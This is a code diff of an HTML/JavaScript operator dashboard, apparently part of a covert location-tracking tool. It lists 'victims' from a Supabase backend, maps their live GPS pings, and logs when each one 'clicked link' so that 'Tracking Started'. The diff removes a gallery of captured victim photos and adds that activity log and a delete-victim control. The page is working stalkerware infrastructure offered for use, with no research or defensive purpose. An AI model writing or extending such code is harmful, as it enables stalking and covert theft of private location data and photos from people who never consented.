@@ -2,40 +2,33 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Stolen Data - Live View</title>
+  <title>Stolen Location View</title>
   <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
   <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
   <style>
     body { margin:0; background:#111; color:#0f0; font-family:Arial; }
-    #map { height:50vh; }
-    .controls { padding:10px; background:#1a1a1a; text-align:center; }
+    #map { height:60vh; }
+    .controls { padding:15px; background:#1a1a1a; text-align:center; }
     select, button { padding:10px; margin:5px; font-size:16px; }
     .delete-victim { background:#c00; color:white; font-weight:bold; }
-    .photos { padding:15px; display:flex; flex-wrap:wrap; gap:12px; }
-    .photo-card { background:#1a1a1a; padding:8px; border-radius:8px; width:300px; position:relative; }
-    .photo-card img { width:100%; border-radius:6px; cursor:pointer; }
-    button { padding:6px 12px; margin:3px; border:none; border-radius:4px; cursor:pointer; }
-    .delete-btn { background:#900; color:white; }
-    .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.98); z-index:1000; justify-content:center; align-items:center; }
-    .modal img { max-width:90%; max-height:85vh; border:4px solid #0f0; }
+    .activity { padding:15px; background:#1a1a1a; max-height:200px; overflow-y:auto; }
+    .log { padding:8px; border-bottom:1px solid #333; }
+    .new { color:#0f0; font-weight:bold; }
   </style>
 </head>
 <body>
-  <h1>🔴 STOLEN DATA DASHBOARD</h1>
+  <h1>🔴 LIVE LOCATION TRACKING DASHBOARD</h1>
   
   <div class="controls">
     <strong>Select Victim: </strong>
     <select id="victimSelect" onchange="loadSelectedVictim()"></select>
-    <button class="delete-victim" onclick="deleteCurrentVictim()">🗑 Delete This Victim + All Data</button>
+    <button class="delete-victim" onclick="deleteCurrentVictim()">🗑 Delete This Victim</button>
   </div>
 
   <div id="map"></div>
-  <h2 style="padding:10px;">📸 Captured Photos</h2>
-  <div class="photos" id="photos"></div>
 
-  <div id="modal" class="modal" onclick="closeModal()">
-    <img id="modalImage" onclick="event.stopImmediatePropagation()">
-  </div>
+  <h2 style="padding:10px;">📋 Activity Log</h2>
+  <div class="activity" id="activityLog"></div>
 
   <script>
     const SUPABASE_URL = "https://yvwnnridpgelbewhoxps.supabase.co";
@@ -47,7 +40,7 @@
     let currentVictimId = "";
 
     async function loadVictimsList() {
-      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id`, {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id,created_at`, {
         headers: { "apikey": SUPABASE_KEY }
       });
       const victims = await res.json();
@@ -70,85 +63,68 @@
 
     async function loadLiveData() {
       let url = `${SUPABASE_URL}/rest/v1/location_pings?select=*&order=created_at.desc`;
-      if (currentVictimId) {
-        url += `&session_id=eq.${currentVictimId}`;
-      }
+      if (currentVictimId) url += `&session_id=eq.${currentVictimId}`;
 
       const res = await fetch(url, { headers: { "apikey": SUPABASE_KEY } });
       const data = await res.json();
 
       map.eachLayer(layer => { if (layer instanceof L.Marker) map.removeLayer(layer); });
 
-      const photosDiv = document.getElementById('photos');
-      photosDiv.innerHTML = "";
-
       data.forEach(item => {
         if (item.lat && item.lon) {
           L.marker([item.lat, item.lon]).addTo(map)
             .bindPopup(`Time: ${new Date(item.created_at).toLocaleString()}`);
         }
-
-        if (item.photo_data) {
-          const div = document.createElement('div');
-          div.className = "photo-card";
-          div.innerHTML = `
-            <img src="${item.photo_data}" onclick="showBigPhoto('${item.photo_data}')">
-            <button class="delete-btn" onclick="deletePhoto('${item.id}'); event.stopImmediatePropagation();">🗑 Delete</button>
-            <small>${new Date(item.created_at).toLocaleString()}</small>
-          `;
-          photosDiv.appendChild(div);
-        }
       });
     }
 
-    function showBigPhoto(src) {
-      document.getElementById('modalImage').src = src;
-      document.getElementById('modal').style.display = "flex";
-    }
-
-    function closeModal() {
-      document.getElementById('modal').style.display = "none";
-    }
-
-    async function deletePhoto(id) {
-      if (!confirm("Delete this photo?")) return;
-      await fetch(`${SUPABASE_URL}/rest/v1/location_pings?id=eq.${id}`, {
-        method: "DELETE",
+    // Activity Log (Shows when victim clicked the link)
+    async function loadActivityLog() {
+      const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?select=id,label,owner_id,created_at&order=created_at.desc&limit=10`, {
         headers: { "apikey": SUPABASE_KEY }
       });
-      loadLiveData();
-    }
+      const sessions = await res.json();
 
+      const logDiv = document.getElementById('activityLog');
+      logDiv.innerHTML = "";
+
+      sessions.forEach(s => {
+        const time = new Date(s.created_at).toLocaleString();
+        const div = document.createElement('div');
+        div.className = "log new";
+        div.innerHTML = `✅ <strong>${s.label}</strong> (${s.owner_id})<br><small>Clicked link at ${time} → Tracking Started</small>`;
+        logDiv.appendChild(div);
+      });
+    }
 
     async function deleteCurrentVictim() {
-      if (!currentVictimId) {
-        alert("Please select a victim first");
-        return;
-      }
-      if (!confirm("Delete this victim and ALL their data?")) return;
+      if (!currentVictimId) return alert("Select a victim first");
+      if (!confirm("Delete this victim and ALL data?")) return;
 
-      // Delete all pings first
       await fetch(`${SUPABASE_URL}/rest/v1/location_pings?session_id=eq.${currentVictimId}`, {
-        method: "DELETE",
-        headers: { "apikey": SUPABASE_KEY }
+        method: "DELETE", headers: { "apikey": SUPABASE_KEY }
       });
 
-      // Delete the victim session
       await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions?id=eq.${currentVictimId}`, {
-        method: "DELETE",
-        headers: { "apikey": SUPABASE_KEY }
+        method: "DELETE", headers: { "apikey": SUPABASE_KEY }
       });
 
-      alert("Victim and all data deleted!");
+      alert("Victim deleted!");
       loadVictimsList();
       currentVictimId = "";
       loadLiveData();
+      loadActivityLog();
     }
 
-    // Initial Load
+    // Initial Load + Auto Refresh
     loadVictimsList();
     loadLiveData();
-    setInterval(loadLiveData, 6000);
+    loadActivityLog();
+
+    setInterval(() => {
+      loadLiveData();
+      loadActivityLog();
+    }, 5000);
   </script>
 </body>
 </html>
